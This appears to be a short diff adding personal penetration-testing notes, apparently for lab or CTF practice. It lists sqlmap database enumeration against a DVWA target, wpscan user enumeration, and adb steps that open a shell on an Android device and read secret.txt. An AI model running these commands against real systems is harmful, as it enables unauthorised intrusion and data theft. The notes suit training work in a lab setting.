@@ -1,0 +1,21 @@
+SQLMap  -- https://github.com/sqlmapproject/sqlmap
+
+> sqlmap --url http:////192.168.48.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit --dbs
+
+
+> wpscan -h
+> wpscan --url http://[IP] --enumerate u 
+>
+
+
+
+use poershell to connect adb
+
+> adb devices
+> adb connect <IP>:Port
+> adb shell
+> whoami
+> cd /sdcard/
+find secret.txt
+> cat secret.txt
+
